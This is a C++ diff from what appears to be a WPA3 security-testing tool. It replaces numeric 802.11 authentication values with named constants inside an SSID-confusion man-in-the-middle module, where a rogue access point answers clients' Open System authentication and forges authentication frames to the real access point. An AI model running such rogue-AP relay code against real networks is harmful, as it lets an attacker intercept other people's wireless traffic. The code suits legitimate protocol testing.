@@ -2,6 +2,7 @@
 #include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
 #include "attacks/mc_mitm/wifi_util.h"
+#include "net_parser/dot11_defs.h"
 #include "system/hw_capabilities.h"
 namespace wpa3_tester::ssid_confusion {
 using namespace Tins;
@@ -37,14 +38,14 @@ FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pd
 
 FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
-		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
+		if(auth->auth_algorithm() == dot11::AUTH_ALG_OPEN && auth->auth_seq_number() == dot11::AUTH_SEQ_REQ) {
 			if(client_state.get_state() >= ClientState::GotMitm) return STOP;
 			// Open System Auth seq=1 ->  seq=2 success
 			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac));
 			resp.addr3(rogue_ap->get(SK::mac));
-			resp.auth_seq_number(2);
-			resp.auth_algorithm(0);
-			resp.status_code(0);
+			resp.auth_seq_number(dot11::AUTH_SEQ_RESP);
+			resp.auth_algorithm(dot11::AUTH_ALG_OPEN);
+			resp.status_code(dot11::STATUS_SUCCESS);
 
 			send_to_rogue(resp);
 			display_traffic(dot11, "Rogue channel", " -- Replied");
@@ -91,9 +92,9 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &, Dot11 &do
 	// auth to real AP so it has authenticated state before the assoc arrives.
 	Dot11Authentication synth_auth(HWAddress<6>(ap.get(SK::mac)), HWAddress<6>(sta.get(SK::mac)));
 	synth_auth.addr3(HWAddress<6>(ap.get(SK::mac)));
-	synth_auth.auth_algorithm(0);
-	synth_auth.auth_seq_number(1);
-	synth_auth.status_code(0);
+	synth_auth.auth_algorithm(dot11::AUTH_ALG_OPEN);
+	synth_auth.auth_seq_number(dot11::AUTH_SEQ_REQ);
+	synth_auth.status_code(dot11::STATUS_SUCCESS);
 	send_to_real(synth_auth);
 
 	send_to_real(full_radiotap);
